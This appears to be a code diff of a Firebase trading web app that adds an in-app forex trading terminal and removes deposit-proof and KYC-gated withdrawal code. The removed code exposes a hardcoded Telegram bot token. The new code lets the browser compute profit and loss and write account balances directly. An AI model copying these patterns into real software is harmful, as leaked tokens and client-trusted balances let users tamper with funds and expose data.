-                <button onclick="selectLivePair('USD/CHF')" class="pair-btn-live" style="padding:8px 14px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:10px; font-size:11px; font-weight:800; cursor:pointer; white-space:nowrap; flex-shrink:0;">USDCHF</button>
-                <button onclick="selectLivePair('XAU/USD')" class="pair-btn-live" style="padding:8px 14px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:10px; font-size:11px; font-weight:800; cursor:pointer; white-space:nowrap; flex-shrink:0;">XAUUSD</button>
-            </div>
-        </div>
-
-        <!-- Chart Area -->
-        <div id="chart-container" style="flex:1; background:#fafaf8; display:flex; flex-direction:column; align-items:center; justify-content:center; overflow:hidden; position:relative;">
-            <div id="chart-error-state" style="text-align:center; padding:40px 20px;">
-                <p style="font-size:14px; color:#94a3b8; font-weight:600;">Price not available, try again in a moment.</p>
-            </div>
-            <canvas id="live-chart" style="display:none; width:100%; height:100%;"></canvas>
-        </div>
-
-        <!-- Buy/Sell & Lot Controls -->
-        <div style="padding:20px; background:white; border-top:1px solid #f1f5f9; display:flex; gap:12px; align-items:center;">
-            <button id="live-sell-btn" onclick="executeLiveTrade('SELL')" style="flex:1; padding:16px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:14px; font-size:13px; font-weight:900; cursor:pointer; text-transform:uppercase; color:#ef4444;">SELL</button>
-            <div style="text-align:center; padding:0 16px;">
-                <p style="font-size:9px; color:#94a3b8; font-weight:700; text-transform:uppercase; margin-bottom:4px;">LOTS</p>
-                <p style="font-size:16px; font-weight:900; color:#0f172a;" id="lot-size">0.01</p>
-            </div>
-            <button id="live-buy-btn" onclick="executeLiveTrade('BUY')" style="flex:1; padding:16px; background:#f8fafc; border:2px solid #e2e8f0; border-radius:14px; font-size:13px; font-weight:900; cursor:pointer; text-transform:uppercase; color:#0f172a;">BUY</button>
-        </div>
-    </div>
-
-    <!-- Trades List (Journal) -->
-    <div id="journal-trades-list" style="flex:1; overflow-y:auto; padding:16px 20px; -webkit-overflow-scrolling:touch; display:none;">
+    <!-- Trades List -->
+    <div id="journal-trades-list" style="flex:1; overflow-y:auto; padding:16px 20px; -webkit-overflow-scrolling:touch;">
         <div style="text-align:center; padding:60px 20px;">
             <div style="width:72px; height:72px; background:#f1f5f9; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 16px;">
                 <i class="fa-solid fa-book-open" style="color:#cbd5e1; font-size:28px;"></i>
@@ -4552,6 +4182,7 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
         auth.onAuthStateChanged(user => {
             if (user) {
                 currentUser = user;
+                if (typeof listenPositions === 'function') listenPositions();
                 db.collection("users").doc(user.uid).onSnapshot((snap) => {
                     if (!snap.exists) return;
                     userData = snap.data();
@@ -4560,17 +4191,12 @@ class="hidden mb-5 p-4 rounded-2xl border-2 border-yellow-300 bg-yellow-50 flex 
                         `Hello, ${userData.firstName || 'User'}`;
                     const newBalance = userData.balance || 0;
 if (currentDepositBalance > 0 && newBalance > currentDepositBalance) {
-    document.getElementById('crypto-payment-box').style.display = 'none';
-    document.getElementById('crypto-buttons-box').style.display = 'block';
     showNairaToast('🎊 Payment Received! $' + (newBalance - currentDepositBalance).toFixed(2) + ' credited!');
     switchTab('home');
 }
-document.getElementById('live-balance').innerText =
-    `$${newBalance.toLocaleString()}`;
-                    document.getElementById('live-profit').innerText =
-                        `$${(userData.profit || 0).toLocaleString()}`;
                     currentProfitBalance = userData.profit || 0;
                     currentDepositBalance = userData.balance || 0;
+                    if (typeof updateHomeBalances === 'function') updateHomeBalances();
 
                     // Extract MT5 details from user doc (use mt5Account map if present, else fallback to separate fields)
                     const mt5Acc = userData.mt5Account || {};
@@ -4581,10 +4207,7 @@ document.getElementById('live-balance').innerText =
                         balance: mt5Acc.balance || userData.mt5Balance || 0
                     };
 
-                    document.getElementById('mt5-login').innerText = userMT5Details.login || 'N/A';
-                    document.getElementById('mt5-pass-display').innerText = '••••••••';
-                    document.getElementById('mt5-server').innerText = userMT5Details.server || 'CyrusCapital-Server';
-                    // mt5-balance-display removed
+                    // MT5 credentials panel was removed with the pivot to in-app trading.
 
                     const hasMT5 = !!(userMT5Details.login && userMT5Details.login !== 'N/A' && userMT5Details.login !== '---');
 const claimPanel = document.getElementById('mt5-claim-panel');
@@ -4606,8 +4229,6 @@ if (userMT5Details.login && !userData.mt5ClaimedAt) {
 }
 checkMT5ActivityWarning();
 calculatePartnerLevel();
-                    document.getElementById('ref-link').value =
-                        `https://cyruscapital.vercel.app/app?ref=${user.uid}`;
                     if (!localStorage.getItem('cyrus_welcome_claimed_' + user.uid)) {
                         document.getElementById('welcome-popup').style.display = 'flex';
                     }
@@ -4721,6 +4342,7 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
 
         function renderHistory(filter) {
             const list = document.getElementById('history-list');
+            if (!list) return;
             let docs = allTransactions;
             if (filter && filter !== 'all') { docs = docs.filter(d => (d.type || '').toLowerCase() === filter
                     .toLowerCase()); }
@@ -5051,19 +4673,339 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
             if (target) target.classList.add('active');
             window.location.hash = tabId;
             window.scrollTo(0, 0);
-
-            if (tabId === 'trade') {
-                if (!liveQuoteInterval) startLiveQuotePolling();
-            } else {
-                if (liveQuoteInterval) clearInterval(liveQuoteInterval);
-                liveQuoteInterval = null;
-            }
+            if (tabId === 'payments' && typeof syncNairaPendingList === 'function') syncNairaPendingList();
+            if (tabId === 'home' && typeof updateHomeBalances === 'function') updateHomeBalances();
+            if (tabId === 'trade' && typeof renderTradeTab === 'function') renderTradeTab();
+            if (tabId === 'quote' && typeof renderQuoteTab === 'function') renderQuoteTab();
+            if (tabId === 'history' && typeof renderPositions === 'function') { renderPositions(); renderDeals(); }
         }
+
+        function switchPaymentsView(view) {
+            document.getElementById('pay-tab-deposit').classList.toggle('active', view === 'deposit');
+            document.getElementById('pay-tab-withdraw').classList.toggle('active', view === 'withdraw');
+            document.getElementById('deposit-naira-content').classList.toggle('hidden', view !== 'deposit');
+            document.getElementById('payments-withdraw-content').classList.toggle('hidden', view !== 'withdraw');
+        }
+        window.switchPaymentsView = switchPaymentsView;
+
+        function openWalletSheet() {
+            document.getElementById('wallet-sheet').classList.add('show');
+            document.getElementById('wallet-sheet-backdrop').classList.add('show');
+        }
+        function closeWalletSheet() {
+            document.getElementById('wallet-sheet').classList.remove('show');
+            document.getElementById('wallet-sheet-backdrop').classList.remove('show');
+        }
+        window.openWalletSheet = openWalletSheet;
+        window.closeWalletSheet = closeWalletSheet;
+
+        // ════════════════════════════════════════════════════════
+        //  TRADING TERMINAL — live quotes, chart, buy/sell positions
+        // ════════════════════════════════════════════════════════
+        const TRADE_SYMBOLS = [
+            { sym: 'EURUSD', api: 'EUR/USD', name: 'Euro vs US Dollar' },
+            { sym: 'GBPUSD', api: 'GBP/USD', name: 'British Pound vs US Dollar' },
+            { sym: 'USDJPY', api: 'USD/JPY', name: 'US Dollar vs Japanese Yen' },
+            { sym: 'USDCHF', api: 'USD/CHF', name: 'US Dollar vs Swiss Franc' },
+            { sym: 'AUDUSD', api: 'AUD/USD', name: 'Australian Dollar vs US Dollar' },
+            { sym: 'USDCAD', api: 'USD/CAD', name: 'US Dollar vs Canadian Dollar' },
+            { sym: 'XAUUSD', api: 'XAU/USD', name: 'Gold vs US Dollar' }
+        ];
+        const TRADE_SPREAD_PCT = 0.0002;
+        const TRADE_CONTRACT_SIZE = 100000;
+        const TRADE_MARGIN_PER_LOT = 1000; // ~1:100 leverage on a 100k lot
+        let liveQuotes = {};
+        let prevTickPrices = {};
+        let tickDirection = {};
+        let openPositions = [];
+        let closedPositions = [];
+        let currentTradeSymbol = 'EURUSD';
+        let tmChart = null, tmSeries = null;
+        let positionsUnsub = null, closedUnsub = null;
+
+        function priceDecimals(price) { return price < 20 ? 5 : 2; }
+
+        async function fetchQuotes() {
+            try {
+                const symbols = TRADE_SYMBOLS.map(s => s.api).join(',');
+                const res = await fetch('/api/quotes?symbols=' + encodeURIComponent(symbols));
+                const data = await res.json();
+                TRADE_SYMBOLS.forEach(s => {
+                    if (data[s.api] && !data[s.api].code) {
+                        liveQuotes[s.sym] = data[s.api];
+                        const price = parseFloat(data[s.api].close);
+                        if (prevTickPrices[s.sym] !== undefined && price !== prevTickPrices[s.sym]) {
+                            tickDirection[s.sym] = price > prevTickPrices[s.sym] ? 'up' : 'down';
+                        }
+                        prevTickPrices[s.sym] = price;
+                    }
+                });
+                renderQuoteTab();
+                updateTradePrices();
+                recomputeOpenPositionsPnL();
+                updateHomeBalances();
+            } catch (e) { console.error('Quote fetch failed', e); }
+        }
+
+        function renderQuoteTab() {
+            const box = document.getElementById('mt-quotes-list');
+            if (!box) return;
+            const rows = TRADE_SYMBOLS.map(s => {
+                const q = liveQuotes[s.sym];
+                if (!q || !q.close) return '';
+                const price = parseFloat(q.close);
+                const up = parseFloat(q.percent_change || 0) >= 0;
+                const dec = priceDecimals(price);
+                return '<div class="mt-row" onclick="selectSymbolForTrade(\'' + s.sym + '\')">' +
+                    '<div><p class="mt-row-sym">' + s.sym + '</p><p class="mt-row-name">' + s.name + '</p></div>' +
+                    '<div class="mt-row-right">' +
+                    '<p class="mt-row-price ' + (up ? 'mt-up' : 'mt-down') + '">' + price.toFixed(dec) + '</p>' +
+                    '<p class="mt-row-sub ' + (up ? 'mt-up' : 'mt-down') + '">' + (up ? '+' : '') + Number(q.percent_change || 0).toFixed(2) + '%</p>' +
+                    '</div></div>';
+            }).join('');
+            box.innerHTML = rows || '<p class="mt-empty">Prices unavailable right now.</p>';
+        }
+
+        function renderSymbolScroller() {
+            const box = document.getElementById('mt-symbol-scroller');
+            if (!box) return;
+            box.innerHTML = TRADE_SYMBOLS.map(s =>
+                '<button class="mt-symbol-chip' + (s.sym === currentTradeSymbol ? ' active' : '') + '" onclick="selectSymbolForTrade(\'' + s.sym + '\')">' + s.sym + '</button>'
+            ).join('');
+        }
+
+        function selectSymbolForTrade(sym) {
+            currentTradeSymbol = sym;
+            switchTab('trade');
+        }
+
+        async function renderTradeTab() {
+            const meta = TRADE_SYMBOLS.find(s => s.sym === currentTradeSymbol) || TRADE_SYMBOLS[0];
+            currentTradeSymbol = meta.sym;
+            renderSymbolScroller();
+            document.getElementById('mt-trade-sym').innerText = meta.sym;
+            document.getElementById('mt-trade-name').innerText = meta.name;
+            updateTradePrices();
+            await loadTradeChart(meta.api);
+        }
+
+        function updateTradePrices() {
+            const sellEl = document.getElementById('mt-trade-sell-price');
+            const buyEl = document.getElementById('mt-trade-buy-price');
+            if (!sellEl || !buyEl) return;
+            const q = liveQuotes[currentTradeSymbol];
+            if (!q || !q.close) return;
+            const price = parseFloat(q.close);
+            const dec = priceDecimals(price);
+            const spread = price * TRADE_SPREAD_PCT;
+            sellEl.innerText = (price - spread / 2).toFixed(dec);
+            buyEl.innerText = (price + spread / 2).toFixed(dec);
+            const isDown = tickDirection[currentTradeSymbol] === 'down';
+            sellEl.closest('.mt-sell-btn').classList.toggle('tick-down', isDown);
+            buyEl.closest('.mt-buy-btn').classList.toggle('tick-down', isDown);
+        }
+
+        async function loadTradeChart(apiSym) {
+            const container = document.getElementById('mt-trade-chart');
+            if (!container || typeof LightweightCharts === 'undefined') return;
+            container.innerHTML = '';
+            tmChart = LightweightCharts.createChart(container, {
+                height: 280, width: container.clientWidth,
+                layout: { background: { color: '#ffffff' }, textColor: '#64748b', fontFamily: 'inherit' },
+                grid: { vertLines: { color: '#f1f5f9' }, horzLines: { color: '#f1f5f9' } },
+                timeScale: { timeVisible: true, borderColor: '#f1f5f9' },
+                rightPriceScale: { borderColor: '#f1f5f9' }
+            });
+            tmSeries = tmChart.addCandlestickSeries({ upColor: '#3b82f6', downColor: '#ef4444', borderVisible: false, wickUpColor: '#3b82f6', wickDownColor: '#ef4444' });
+            try {
+                const res = await fetch('/api/candles?symbol=' + encodeURIComponent(apiSym) + '&interval=5min');
+                const data = await res.json();
+                if (data.values) {
+                    const candles = data.values.slice().reverse().map(v => ({
+                        time: Math.floor(new Date(v.datetime.replace(' ', 'T')).getTime() / 1000),
+                        open: +v.open, high: +v.high, low: +v.low, close: +v.close
+                    }));
+                    tmSeries.setData(candles);
+                }
+            } catch (e) { console.error('Chart load failed', e); }
+        }
+
+        async function placeTrade(side) {
+            if (!currentUser) { alert('Please login first.'); return; }
+            const lots = parseFloat(document.getElementById('mt-trade-lots').value) || 0.01;
+            const q = liveQuotes[currentTradeSymbol];
+            if (!q || !q.close) { alert('Price not available, try again in a moment.'); return; }
+            const price = parseFloat(q.close);
+            const spread = price * TRADE_SPREAD_PCT;
+            const execPrice = side === 'buy' ? price + spread / 2 : price - spread / 2;
+            const marginRequired = lots * TRADE_MARGIN_PER_LOT;
+            const balance = (userData && userData.balance) || 0;
+            if (marginRequired > balance) { alert('Insufficient balance for this position size.'); return; }
+            try {
+                await db.collection('positions').add({
+                    uid: currentUser.uid, symbol: currentTradeSymbol, side: side, lots: lots,
+                    openPrice: execPrice, openTime: firebase.firestore.FieldValue.serverTimestamp(),
+                    status: 'open'
+                });
+                showNairaToast(side.toUpperCase() + ' ' + lots + ' ' + currentTradeSymbol + ' opened at ' + execPrice.toFixed(5));
+            } catch (e) { alert('Failed to open position: ' + e.message); }
+        }
+
+        function listenPositions() {
+            if (!currentUser) return;
+            if (positionsUnsub) positionsUnsub();
+            if (closedUnsub) closedUnsub();
+            positionsUnsub = db.collection('positions').where('uid', '==', currentUser.uid).where('status', '==', 'open').onSnapshot(snap => {
+                openPositions = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+                const badge = document.getElementById('mt-positions-count');
+                if (badge) { badge.innerText = openPositions.length; badge.classList.toggle('hidden', openPositions.length === 0); }
+                recomputeOpenPositionsPnL();
+                updateHomeBalances();
+            });
+            closedUnsub = db.collection('positions').where('uid', '==', currentUser.uid).where('status', '==', 'closed').orderBy('closeTime', 'desc').limit(50).onSnapshot(snap => {
+                closedPositions = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+                renderDeals();
+            });
+        }
+
+        function calcPnl(pos) {
+            const q = liveQuotes[pos.symbol];
+            if (!q || !q.close) return 0;
+            const price = parseFloat(q.close);
+            const spread = price * TRADE_SPREAD_PCT;
+            const closePrice = pos.side === 'buy' ? price - spread / 2 : price + spread / 2;
+            const diff = pos.side === 'buy' ? (closePrice - pos.openPrice) : (pos.openPrice - closePrice);
+            return diff * pos.lots * TRADE_CONTRACT_SIZE;
+        }
+
+        function recomputeOpenPositionsPnL() {
+            openPositions.forEach(p => { p.pnl = calcPnl(p); });
+            const activeView = document.getElementById('mt-view-positions');
+            if (activeView && !activeView.classList.contains('hidden')) renderPositions();
+        }
+
+        function renderPositions() {
+            const box = document.getElementById('mt-positions-list');
+            if (!box) return;
+            if (openPositions.length === 0) { box.innerHTML = '<p class="mt-empty">No open positions.</p>'; return; }
+            box.innerHTML = openPositions.map(p => {
+                const pnl = p.pnl || 0;
+                const cls = pnl >= 0 ? 'mt-up' : 'mt-down';
+                const sideColor = p.side === 'buy' ? '#3b82f6' : '#ef4444';
+                return '<div class="mt-row" style="cursor:default;">' +
+                    '<div><p class="mt-row-sym">' + p.symbol + ' <span style="color:' + sideColor + ';font-size:10px;text-transform:uppercase;">' + p.side + ' ' + p.lots + '</span></p>' +
+                    '<p class="mt-row-name">Opened at ' + Number(p.openPrice).toFixed(5) + '</p></div>' +
+                    '<div class="mt-row-right"><p class="mt-row-price ' + cls + '">' + (pnl >= 0 ? '+' : '') + '$' + pnl.toFixed(2) + '</p>' +
+                    '<button onclick="closePosition(\'' + p.id + '\')" class="mt-close-btn">Close</button></div></div>';
+            }).join('');
+        }
+
+        async function closePosition(id) {
+            const pos = openPositions.find(p => p.id === id);
+            if (!pos) return;
+            const pnl = calcPnl(pos);
+            const q = liveQuotes[pos.symbol];
+            const spread = q.close * TRADE_SPREAD_PCT;
+            const closePrice = pos.side === 'buy' ? q.close - spread / 2 : q.close + spread / 2;
+            try {
+                await db.runTransaction(async t => {
+                    const userRef = db.collection('users').doc(currentUser.uid);
+                    const snap = await t.get(userRef);
+                    const newBalance = Math.max(0, (snap.data().balance || 0) + pnl);
+                    t.update(userRef, { balance: newBalance });
+                    t.update(db.collection('positions').doc(id), {
+                        status: 'closed', closePrice: closePrice,
+                        closeTime: firebase.firestore.FieldValue.serverTimestamp(), pnl: pnl
+                    });
+                });
+                showNairaToast('Position closed: ' + (pnl >= 0 ? '+' : '') + '$' + pnl.toFixed(2));
+            } catch (e) { alert('Failed to close position: ' + e.message); }
+        }
+
+        function switchHistoryView(view, btn) {
+            document.querySelectorAll('#history .mt-view').forEach(v => v.classList.add('hidden'));
+            document.querySelectorAll('#history .mt-subnav-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('mt-view-' + view).classList.remove('hidden');
+            if (btn) btn.classList.add('active');
+            if (view === 'positions') renderPositions();
+            if (view === 'deals') renderDeals();
+        }
+
+        function renderDeals() {
+            const list = document.getElementById('mt-deals-list');
+            const summaryBox = document.getElementById('mt-deals-summary');
+            if (!list) return;
+            const tradeProfit = closedPositions.reduce((sum, p) => sum + (p.pnl || 0), 0);
+            const deposits = allTransactions.filter(t => (t.type || '').toLowerCase().includes('deposit') && t.status !== 'rejected').reduce((sum, t) => sum + (t.amount || 0), 0);
+            const withdrawals = allTransactions.filter(t => (t.type || '').toLowerCase() === 'withdrawal').reduce((sum, t) => sum + (t.amount || 0), 0);
+            const balance = (userData && userData.balance) || 0;
+            if (summaryBox) {
+                summaryBox.innerHTML =
+                    '<div class="mt-summary-row"><span class="lbl">Profit:</span><span class="val ' + (tradeProfit >= 0 ? 'mt-up' : 'mt-down') + '">' + tradeProfit.toFixed(2) + '</span></div>' +
+                    '<div class="mt-summary-row"><span class="lbl">Deposit</span><span class="val mt-up">' + deposits.toFixed(2) + '</span></div>' +
+                    '<div class="mt-summary-row"><span class="lbl">Withdrawal:</span><span class="val mt-down">-' + withdrawals.toFixed(2) + '</span></div>' +
+                    '<div class="mt-summary-row"><span class="lbl">Swap:</span><span class="val">0.00</span></div>' +
+                    '<div class="mt-summary-row"><span class="lbl">Commission:</span><span class="val">0.00</span></div>' +
+                    '<div class="mt-summary-row"><span class="lbl">Balance:</span><span class="val">' + balance.toFixed(2) + '</span></div>';
+            }
+            const deals = [];
+            closedPositions.forEach(p => deals.push({ kind: 'trade', time: p.closeTime ? p.closeTime.toMillis() : 0, data: p }));
+            allTransactions.forEach(t => deals.push({ kind: 'tx', time: t.timestamp ? t.timestamp.toMillis() : 0, data: t }));
+            deals.sort((a, b) => b.time - a.time);
+            if (deals.length === 0) { list.innerHTML = '<p class="mt-empty">No deals yet.</p>'; return; }
+            list.innerHTML = deals.slice(0, 60).map(d => {
+                if (d.kind === 'trade') {
+                    const p = d.data;
+                    const pnl = p.pnl || 0;
+                    const cls = pnl >= 0 ? 'mt-up' : 'mt-down';
+                    const sideColor = p.side === 'buy' ? '#3b82f6' : '#ef4444';
+                    const date = p.closeTime ? p.closeTime.toDate().toLocaleString() : '';
+                    return '<div class="mt-row" style="cursor:default;">' +
+                        '<div><p class="mt-row-sym">' + p.symbol + ', <span style="color:' + sideColor + ';">' + p.side + ' ' + p.lots + '</span></p>' +
+                        '<p class="mt-row-name">' + Number(p.openPrice).toFixed(5) + ' &rarr; ' + Number(p.closePrice || 0).toFixed(5) + '<br>' + date + '</p></div>' +
+                        '<p class="mt-row-price ' + cls + '">' + (pnl >= 0 ? '+' : '') + pnl.toFixed(2) + '</p></div>';
+                } else {
+                    const t = d.data;
+                    const amt = t.amount || 0;
+                    const isCredit = !(t.type || '').toLowerCase().includes('withdraw');
+                    const cls = isCredit ? 'mt-up' : 'mt-down';
+                    const date = t.timestamp ? t.timestamp.toDate().toLocaleString() : '';
+                    return '<div class="mt-row" style="cursor:default;">' +
+                        '<div><p class="mt-row-sym">' + (t.type || 'Transaction') + '</p>' +
+                        '<p class="mt-row-name">' + date + '</p></div>' +
+                        '<p class="mt-row-price ' + cls + '">' + (isCredit ? '+' : '-') + amt.toFixed(2) + '</p></div>';
+                }
+            }).join('');
+        }
+
+        function updateHomeBalances() {
+            const balance = (userData && userData.balance) || 0;
+            const usedMargin = openPositions.reduce((sum, p) => sum + p.lots * TRADE_MARGIN_PER_LOT, 0);
+            const floatingPnl = openPositions.reduce((sum, p) => sum + (p.pnl || 0), 0);
+            const equity = balance + floatingPnl;
+            const freeMargin = equity - usedMargin;
+            const balEl = document.getElementById('mt-home-balance');
+            const eqEl = document.getElementById('mt-home-equity');
+            const marEl = document.getElementById('mt-home-margin');
+            if (balEl) balEl.innerText = '$' + balance.toFixed(2);
+            if (eqEl) eqEl.innerText = '$' + equity.toFixed(2);
+            if (marEl) marEl.innerText = '$' + freeMargin.toFixed(2);
+            const drawerBal = document.getElementById('drawer-balance');
+            if (drawerBal) drawerBal.innerText = '$' + balance.toFixed(2);
+        }
+
+        window.selectSymbolForTrade = selectSymbolForTrade;
+        window.placeTrade = placeTrade;
+        window.closePosition = closePosition;
+        window.switchHistoryView = switchHistoryView;
+
+        fetchQuotes();
+        setInterval(fetchQuotes, 20000);
 
         // ── AUTO LOAD TAB FROM URL HASH ──
         function loadTabFromHash() {
             const hash = window.location.hash.replace('#', '');
-            const validTabs = ['home', 'payments', 'trade', 'withdrawal', 'analyzer', 'kyc', 'history'];
+            const validTabs = ['home', 'trade', 'history', 'quote', 'payments'];
             if (hash && validTabs.includes(hash)) {
                 switchTab(hash);
             }
@@ -5072,7 +5014,7 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
         // Listen for back/forward browser navigation
         window.addEventListener('hashchange', () => {
             const hash = window.location.hash.replace('#', '');
-            const validTabs = ['home', 'payments', 'trade', 'withdrawal', 'analyzer', 'kyc', 'history'];
+            const validTabs = ['home', 'trade', 'history', 'quote', 'payments'];
             if (hash && validTabs.includes(hash)) {
                 const target = document.getElementById(hash);
                 if (target) {
@@ -5102,30 +5044,6 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
         function goToKyc() { document.getElementById('kyc-lock-modal').style.display = 'none';
             switchTab('kyc'); }
 
-        function openDepositProof() {
-            proofScreenshotFile = null;
-            document.getElementById('proof-payment-id').value = '';
-            document.getElementById('proof-amount').value = '';
-            document.getElementById('proof-screenshot-input').value = '';
-            document.getElementById('proof-upload-ui').innerHTML =
-                `<div class="h-10 w-10 bg-white rounded-full flex items-center justify-center mx-auto mb-2 shadow-sm"><i class="fa-solid fa-camera text-yellow-500"></i></div><p class="text-[11px] font-black text-slate-600 uppercase">Tap to Upload Screenshot</p><p class="text-[9px] font-bold text-slate-400 mt-1">JPG / PNG — helps speed up verification</p>`;
-            document.getElementById('proof-upload-zone').classList.remove('file-selected');
-            document.getElementById('deposit-proof-modal').style.display = 'flex';
-        }
-
-        function closeDepositProof() { document.getElementById('deposit-proof-modal').style.display = 'none';
-            proofScreenshotFile = null; }
-
-        function handleProofScreenshot(input) {
-            if (input.files && input.files[0]) {
-                proofScreenshotFile = input.files[0];
-                const zone = document.getElementById('proof-upload-zone');
-                zone.classList.add('file-selected');
-                document.getElementById('proof-upload-ui').innerHTML =
-                    `<div class="h-10 w-10 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-2"><i class="fa-solid fa-circle-check text-green-500"></i></div><p class="text-[11px] font-black text-green-700 uppercase">${input.files[0].name}</p><p class="text-[9px] font-bold text-green-500 mt-1">Screenshot ready to upload</p>`;
-            }
-        }
-
         function openDashboardSupportModal() { document.getElementById('dashboard-support-modal').style.display =
             'flex'; }
 
@@ -5154,78 +5072,6 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
                 reader.onerror = () => reject(new Error('Failed to read image file.'));
                 reader.readAsDataURL(file);
             });
-        }
-
-        async function submitDepositProof() {
-            const paymentId = document.getElementById('proof-payment-id').value.trim();
-            const amount = parseFloat(document.getElementById('proof-amount').value);
-            const btn = document.getElementById('proof-submit-btn');
-            if (!paymentId) { alert("Please enter your Payment ID."); return; }
-            if (!amount || amount <= 0) { alert("Please enter a valid amount."); return; }
-            if (!currentUser) { alert("Not logged in."); return; }
-            const originalHTML = btn.innerHTML;
-            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> Submitting...`;
-            btn.disabled = true;
-            try {
-                let imageUrl = null;
-                if (proofScreenshotFile) {
-                    try {
-                        btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> Uploading image...`;
-                        imageUrl = await uploadToImgBB(proofScreenshotFile);
-                    } catch (uploadErr) {
-                        const proceed = confirm("Image upload failed: " + uploadErr.message +
-                            "\n\nContinue submitting proof without the screenshot?");
-                        if (!proceed) { btn.innerHTML = originalHTML;
-                            btn.disabled = false; return; }
-                    }
-                }
-                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin mr-2"></i> Saving...`;
-                await db.collection("depositProofs").add({
-                    uid: currentUser.uid,
-                    userEmail: currentUser.email || "",
-                    firstName: userData.firstName || "User",
-                    paymentId: paymentId,
-                    amount: amount,
-                    imageUrl: imageUrl,
-                    screenshotUrl: imageUrl,
-                    status: "pending",
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                });
-                // Telegram notification
-                fetch(`https://api.telegram.org/bot8305268349:AAFugGOJ0mAVxYuB1LFoP4WwC_MHNS6j99c/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: "-1003903750289",
-                        text: `💰 <b>New Deposit Proof</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🆔 Payment ID: ${paymentId || "N/A"}\n⏰ Time: ${new Date().toLocaleString()}`,
-                        parse_mode: "HTML"
-                    })
-                }).catch(() => {});
-                // Telegram notification
-                fetch(`https://api.telegram.org/bot8305268349:AAFugGOJ0mAVxYuB1LFoP4WwC_MHNS6j99c/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: "-1003903750289",
-                        text: `💰 <b>New Deposit Proof</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🆔 Payment ID: ${paymentId || "N/A"}\n⏰ Time: ${new Date().toLocaleString()}`,
-                        parse_mode: "HTML"
-                    })
-                }).catch(() => {});
-                await db.collection("transactions").add({
-                    uid: currentUser.uid,
-                    type: 'Deposit Proof',
-                    amount: amount,
-                    status: 'pending',
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    metadata: { paymentId: paymentId, userEmail: currentUser.email || "", imageUrl: imageUrl,
-                        screenshotUrl: imageUrl }
-                });
-                closeDepositProof();
-                alert("Deposit proof submitted! Verification takes up to 15 minutes.");
-                switchTab('history');
-            } catch (err) { alert("Submission failed: " + err.message); } finally { btn.innerHTML =
-            originalHTML;
-                btn.disabled = false; }
         }
 
         function copyRef() { const c = document.getElementById("ref-link");
@@ -5394,39 +5240,17 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
         }
 
         function checkKycStatus(btn) {
-            const isCrypto = btn.innerText.includes('USDT');
-            const amountVal = isCrypto ? document.getElementById('crypto-amount').value : document.getElementById(
-                'withdraw-input-ngn').value;
+            const amountVal = document.getElementById('withdraw-input-ngn').value;
             const amount = parseFloat(amountVal);
             if (!amount || amount <= 0) { alert("Please enter a valid amount."); return; }
-            if (amount > currentProfitBalance) { alert(
-                    "Withdrawal amount exceeds your current profit balance."); return; }
-            if (!isVerified) {
-                const kycStatusDisplay = document.getElementById('kyc-status-display');
-                const kycStatus = userData.kycStatus || 'none';
-                if (kycStatusDisplay) kycStatusDisplay.innerText = kycStatus;
-                const kycLockReason = document.getElementById('kyc-lock-reason');
-                if (kycStatus === 'pending') {
-                    if (kycLockReason) kycLockReason.innerHTML =
-                        `KYC is <span class="text-blue-400 font-black">under review</span>. Withdrawals will unlock once approved.`;
-                } else if (kycStatus === 'rejected') {
-                    if (kycLockReason) kycLockReason.innerHTML =
-                        `KYC was <span class="text-red-400 font-black">rejected</span>. Please resubmit your documents.`;
-                } else {
-                    if (kycLockReason) kycLockReason.innerHTML =
-                        `Your identity is <span class="text-yellow-500 font-black">not verified</span>. Complete KYC to withdraw.`;
-                }
-                document.getElementById('kyc-lock-modal').style.display = 'flex';
-                return;
-            }
+            if (amount > ((userData && userData.balance) || 0)) { alert(
+                    "Withdrawal amount exceeds your current balance."); return; }
             triggerProcessWithdraw(btn);
         }
 
         async function triggerProcessWithdraw(btn) {
             const originalHTML = btn.innerHTML;
-            const isCrypto = btn.innerText.includes('USDT');
-            const amountInput = isCrypto ? document.getElementById('crypto-amount').value : document.getElementById(
-                'withdraw-input-ngn').value;
+            const amountInput = document.getElementById('withdraw-input-ngn').value;
             const amount = parseFloat(amountInput);
             btn.innerText = "processing....";
             btn.classList.add('processing-blink');
@@ -5435,11 +5259,9 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
                     const userRef = db.collection("users").doc(currentUser.uid);
                     const userSnap = await t.get(userRef);
                     if (!userSnap.exists) throw new Error("User not found");
-                    const latestKyc = userSnap.data().kycStatus;
-                    if (latestKyc !== 'verified') throw new Error("KYC not verified. Cannot withdraw.");
-                    const latestProfit = userSnap.data().profit || 0;
-                    if (latestProfit < amount) throw new Error("Insufficient profit balance.");
-                    t.update(userRef, { profit: parseFloat((latestProfit - amount).toFixed(2)) });
+                    const latestBalance = userSnap.data().balance || 0;
+                    if (latestBalance < amount) throw new Error("Insufficient balance.");
+                    t.update(userRef, { balance: parseFloat((latestBalance - amount).toFixed(2)) });
                 });
                 const txData = {
